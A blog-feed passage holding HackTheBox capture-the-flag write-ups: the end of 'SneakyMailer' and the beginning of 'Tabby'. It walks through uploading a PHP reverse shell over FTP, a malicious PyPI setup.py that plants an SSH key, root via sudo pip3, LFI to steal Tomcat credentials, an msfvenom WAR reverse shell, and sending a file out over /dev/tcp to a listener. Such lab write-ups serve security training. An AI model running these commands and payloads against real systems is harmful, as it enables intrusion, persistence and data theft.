<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">211-FTP server status:
     Connected to ::ffff:10.10.14.20
     Logged in as developer
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is <span style="color:#ae81ff">300</span>
     Control connection is plain text
     Data connections will be plain text
     At session startup, client count was <span style="color:#ae81ff">1</span>
     vsFTPd 3.0.3 - secure, fast, stable
ftp&gt; cd /dev
<span style="color:#ae81ff">250</span> Directory successfully changed.
ftp&gt; put /shares/reversef.php iamf.php
local: /shares/reversef.php remote: iamf.php
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Ok to send data.
<span style="color:#ae81ff">226</span> Transfer complete.
<span style="color:#ae81ff">72</span> bytes sent in 0.00 secs <span style="color:#f92672">(</span>2.8610 MB/s<span style="color:#f92672">)</span>
</code></pre></div><p>At first I thought it was on <code>http://sneakycorp.htb/iamf.php</code>, the uploaded shell was available on <code>http://dev.sneakycorp.htb/iamf.php</code>, so I&rsquo;ll have to add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</code></pre></div><p>Now I can trigger my web shell with curl.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ curl -s http://dev.sneakycorp.htb/iamf.php
</code></pre></div><p>The listener has an interactive shell now.</p>
<p><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt="43276abaf55b4760822901631d8c21de" style="zoom:67%;" /></p>
<p>After gaining access to the box, I can re-enumerate and search for files containing sensitive data.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-low">Shell as low</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
<p><img src="imgs/image-20210429003013735.png" alt="image-20210429003013735" style="zoom: 67%;" /></p>
<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
<p><img src="imgs/image-20210429003321320.png" alt="image-20210429003321320" style="zoom:67%;" /></p>
<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
<h4 id="cracking-password">Cracking Password</h4>
<p>The password can be cracked easily with John the Ripper.</p>
<p><img src="imgs/image-20210429003613068.png" alt="image-20210429003613068" style="zoom:67%;" /></p>
<p>The password is <code>soufianeelhaoui</code></p>
<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
<p>Looking into the web configuration file, <code>pypi.sneakycorp.htb</code> is accessible on <code>localhost:5000</code>.</p>
<p><img src="imgs/image-20210429005849918.png" alt="image-20210429005849918" style="zoom: 67%;" /></p>
<p>It is also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
<p><img src="imgs/image-20210429005829551.png" alt="image-20210429005829551" style="zoom:67%;" /></p>
<p>Remember about the second email Paul sent to user law?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
</code></pre></div><p>Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
<ul>
<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
</ul>
<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;README.md&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> fh:
    long_description <span style="color:#f92672">=</span> fh<span style="color:#f92672">.</span>read()

setuptools<span style="color:#f92672">.</span>setup(
    name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span>, <span style="color:#75715e"># Replace with your own username</span>
    version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
    author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
    author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
    description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
    long_description<span style="color:#f92672">=</span>long_description,
    long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
    url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
    project_urls<span style="color:#f92672">=</span>{
        <span style="color:#e6db74">&#34;Bug Tracker&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject/issues&#34;</span>,
    },
    classifiers<span style="color:#f92672">=</span>[
        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
    ],
    package_dir<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;&#34;</span>: <span style="color:#e6db74">&#34;src&#34;</span>},
    packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(where<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;src&#34;</span>),
    python_requires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&gt;=3.6&#34;</span>,
)
</code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools
<span style="color:#66d9ef">try</span>:
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/home/low/.ssh/authorized_keys&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
                f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span>)
        f<span style="color:#f92672">.</span>close()
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
        <span style="color:#66d9ef">pass</span>
setuptools<span style="color:#f92672">.</span>setup(
        name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;low&#34;</span>,
        version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
        author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
        author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
        description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
        long_description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>,
        long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
     url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
     packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(),
     classifiers<span style="color:#f92672">=</span>[
        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
     ],
)
</code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
 <span style="color:#a6e22e">local</span>
 
[<span style="color:#a6e22e">local</span>]
<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#ae81ff">127.0</span>.<span style="color:#ae81ff">0.1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span>
<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
</code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
 <span style="color:#a6e22e">remote</span>
 
[<span style="color:#a6e22e">remote</span>]
<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#a6e22e">pypi</span>.<span style="color:#a6e22e">sneakycorp</span>.<span style="color:#a6e22e">htb</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>
<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
</code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.42» 
$ python3 -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:12<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:29<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /setup.py HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><p>On SneakyMailer:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
www-data@sneakymailer:/dev/shm$ 
www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">.
├── .pypirc
├── iamf.php
└── setup.py
</code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ export $HOME<span style="color:#f92672">=</span>/dev/shm
www-data@sneakymailer:~$
</code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:~$ python3 setup.py sdist upload -r local
running sdist
running egg_info
writing low.egg-info/PKG-INFO
writing dependency_links to low.egg-info/dependency_links.txt
writing top-level names to low.egg-info/top_level.txt
reading manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
writing manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
running check
creating low-0.0.1
creating low-0.0.1/low.egg-info
copying files to low-0.0.1…
copying setup.py -&gt; low-0.0.1
copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
Writing low-0.0.1/setup.cfg
Creating tar archive
removing <span style="color:#e6db74">&#39;low-0.0.1&#39;</span> <span style="color:#f92672">(</span>and everything under it<span style="color:#f92672">)</span>
running upload
Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response <span style="color:#f92672">(</span>200<span style="color:#f92672">)</span>: OK
WARNING: Uploading via this command is deprecated, use twine to upload instead <span style="color:#f92672">(</span>https://pypi.org/p/twine/<span style="color:#f92672">)</span>
</code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Now I can login with my private key as user <code>low</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ ssh -i id_ecdsa low@10.10.10.197
</code></pre></div><p><img src="imgs/image-20210429021145269.png" alt="image-20210429021145269" style="zoom:67%;" /></p>
<p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
<p><img src="imgs/image-20210429021533891.png" alt="image-20210429021533891" style="zoom: 67%;" /></p>
<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">low@sneakymailer:~$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
low@sneakymailer:~$
low@sneakymailer:~$ echo <span style="color:#e6db74">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
</code></pre></div><p><img src="imgs/image-20210429021914961.png" alt="image-20210429021914961" style="zoom:67%;" /></p>
<p>Or to get a shell as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$
low@sneakymailer:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.9ShSegy5bm
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Tabby</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tabby/</link>
      <pubDate>Mon, 26 Apr 2021 21:26:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tabby/</guid>
      <description>Abusing Tomcat manager-script roles and escalate to root with LXC container</description>
      <content:encoded><![CDATA[<p>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious <code>.war</code> file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Local File Inclusion</li>
<li>Abusing Tomcat <code>manager-script</code> roles</li>
<li>Privilege escalation with lxc/lxd group.</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>BurpSuite - <a href="https://portswigger.net/burp">https://portswigger.net/burp</a></li>
<li>curl - Preinstalled in Kali Linux</li>
<li>msfvenom - Preinstalled in Kali Linux</li>
<li>alpine-builder - <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
$ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds</span>
</code></pre></div><p>An initial <code>nmap</code> scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a company website that offers hosting services called &ldquo;Mega Hosting&rdquo;.</p>
<p><div class="img-container"><img src="imgs/19847b521b1c48b08f57e8e4986fcc06.png" alt="19847b521b1c48b08f57e8e4986fcc06"  /></div>
</p>
<p>The domain name of this site is revealed from the email address and also from the page source</p>
<p><div class="img-container"><img src="imgs/image-20210426220259010.png" alt="image-20210426220259010"  /></div>
</p>
<p>I&rsquo;ll add <code>megahosting.htb</code> to <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.194 megahosting.htb
</code></pre></div><p>The company statement about data breach points to this link <code>http://megahosting.htb/news.php?file=statement</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210426215350459.png" alt="image-20210426215350459"  /></div>
</p>
<p>They mentioned a tool, but I have no idea what tool it is.</p>
<p>I ran gobuster but found nothing really interesting there.</p>
<h3 id="tcp-8080---tomcat">TCP 8080 - Tomcat</h3>
<p>Visiting port 8080 shows the Tomcat default page.</p>
<p><div class="img-container"><img src="imgs/09afc545cd1943dbb578574d338d0943.png" alt="09afc545cd1943dbb578574d338d0943"  /></div>
</p>
<p>Both &ldquo;manager webapp&rdquo; and &ldquo;host-manager webapp&rdquo; are asking for credentials. I tried using Tomcat&rsquo;s default credentials, but it didn&rsquo;t work.</p>
<p><div class="img-container"><img src="imgs/0aedd7409c3444a3bb359bb837b33c93.png" alt="0aedd7409c3444a3bb359bb837b33c93"  /></div>
</p>
<p>I&rsquo;ll take note on these:</p>
<ul>
<li>/etc/tomcat9/tomcat-users.xml</li>
<li>&ldquo;tomcat9&rdquo;</li>
</ul>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h4>
<p>I found out the file parameter on <code>http://megahosting.htb/news.php?file=statement</code> is vulnerable to LFI.</p>
<blockquote>
<p>The LFI can be identified by assuming the website is hosted at <code>/var/www/html/megahosting/</code>. So the payload would be ../../../../file/to/read</p>
</blockquote>
<p><img src="imgs/42fb887abe344db48a138d3b7707cf5d.png" alt="42fb887abe344db48a138d3b7707cf5d" style="zoom:80%;" /></p>
<p>But the read access is limited.</p>
<h4 id="getting-tomcat-credentials">Getting tomcat Credentials</h4>
<p>According to the Tomcat default page, it says that &ldquo;Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code>&rdquo;, so I tried to leverage the LFI to read that file but it returned with a blank.</p>
<p><img src="imgs/efc8b8670fa0473085bfd66dad7670f2.png" alt="efc8b8670fa0473085bfd66dad7670f2" style="zoom:80%;" /></p>
<p>With basic Linux knowledge and service fingerprint from the <code>nmap</code> result, I can search for the exact location of the installed Tomcat.</p>
<p>First, in Linux, every software application is most likely installed in one of the following directories:</p>
<ul>
<li><code>/usr/share/appname</code></li>
<li><code>/usr/lib/appname</code></li>
<li><code>/opt/appname</code></li>
<li><code>/var/lib/appname</code></li>
</ul>
<p>Second, according to the <code>nmap</code> result, <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=OpenSSH+8.2p1&amp;searchon=all">OpenSSH version 8.2p1</a> and <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=apache2+2.4.41&amp;searchon=all">Apache version 2.4.41</a>. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=tomcat9&amp;searchon=all">search</a>, and find the install location of <a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist">Tomcat9 on Ubuntu 20.04</a>.</p>
<p>The search brought me to this location <code>/usr/share/tomcat9/etc/tomcat-users.xml</code>, and that seems to be the correct location.</p>
<p><div class="img-container"><img src="imgs/531dc2a899f54b368f3fdadb83623272.png" alt="531dc2a899f54b368f3fdadb83623272"  /></div>
</p>
<p>The credentials is <code>tomcat:$3cureP4s5w0rd123!</code></p>
<h4 id="html-gui---host-manager-webapp">HTML GUI - host-manager-webapp</h4>
<p>When I tried to access the host-manager-webapp with <em>-not-working-</em> default credentials, the page says something about the roles that concerns me.</p>
<p><div class="img-container"><img src="imgs/image-20210426232907769.png" alt="image-20210426232907769"  /></div>
</p>
<p>Then, based on the <code>tomcat-users.xml</code> file, <code>tomcat</code> has two roles, <code>admin-gui</code> and <code>manager-script</code>. That means the credentials is not authorized on manager-webapp (<code>/manager</code>), but it will work on host-manager-webapp (<code>/host-manager</code>),</p>
<p><div class="img-container"><img src="imgs/102088bcbb8b46a79a0f333b027bcaa2.png" alt="102088bcbb8b46a79a0f333b027bcaa2"  /></div>
</p>
<p>Another interesting one is, if I clicked the Server Status from <code>/host-manager</code> it just redirects me to <code>http://10.10.10.194:8080/manager/status/all</code>, and it doesn&rsquo;t complain about the authorization. The page is seen below</p>
<p><div class="img-container"><img src="imgs/314b3cdbc1964a699afeb20044dbc792.png" alt="314b3cdbc1964a699afeb20044dbc792"  /></div>
</p>
<p>So, I think I can access some features behind <code>/manager/[here]</code>. From the page above, the server accepts JSP/JSPX files.</p>
<h4 id="text-interface---manager-webapp">Text Interface - manager-webapp</h4>
<p>The second role of user tomcat is <code>manager-script</code>.</p>
<p>From <a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">this article</a></p>
<blockquote>
<p><code>manager-script</code> provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI</p>
</blockquote>
<p>This concludes that I can access some features behind <code>/manager/</code> but not from the GUI, instead it uses text-based. The full documentation of what you can do with this role is available <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands">here</a></p>
<h4 id="deploying-malicious-war">Deploying Malicious WAR</h4>
<p>With <code>manager-script</code> role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious <code>.war</code> file that is embedded with jsp reverse shell.</p>
<p>First, I&rsquo;ll craft a <code>.war</code> file payload using <code>msfvenom</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
$ msfvenom -p java/jsp_shell_reverse_tcp lhost<span style="color:#f92672">=</span>10.10.14.30 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">9000</span> -f war -o iamf.war
</code></pre></div><p>Then I&rsquo;ll upload the payload using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
$ curl -u <span style="color:#e6db74">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path<span style="color:#f92672">=</span>/iamf.war
</code></pre></div><ul>
<li>-u : for credential [username:password]</li>
<li>-T : for transfer file</li>
</ul>
<p>I&rsquo;ll setup listener, and then trigger the payload also using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
$ curl http://10.10.10.194:8080/iamf.war
</code></pre></div><p>My listener now have a shell.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*TG4UfRosbeX5ncZtEoIVng.png" alt="img"  /></div>
</p>
<p>I can upgrade the shell into TTY using this trick.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ script /dev/null; bash
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-ash">Shell as ash</h3>
<p>Enumeration</p>
<p>Manual enumeration with the <code>find</code> command discovered a backup file in zip format that is owned by user <code>ash</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ find / -type f -user ash 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#39;proc&#39;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/47eaa7bb176b445fa6a091ac49e5f32f.png" alt="47eaa7bb176b445fa6a091ac49e5f32f"  /></div>
</p>
<p>I&rsquo;ll transfer the backup file to my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip &gt; /dev/tcp/10.10.14.30/9001
</code></pre></div><p>And receive it on my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
$ nc -nvlp <span style="color:#ae81ff">9001</span> &gt; 16162020_backup.zip
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.30<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.194<span style="color:#f92672">]</span> <span style="color:#ae81ff">65056</span>
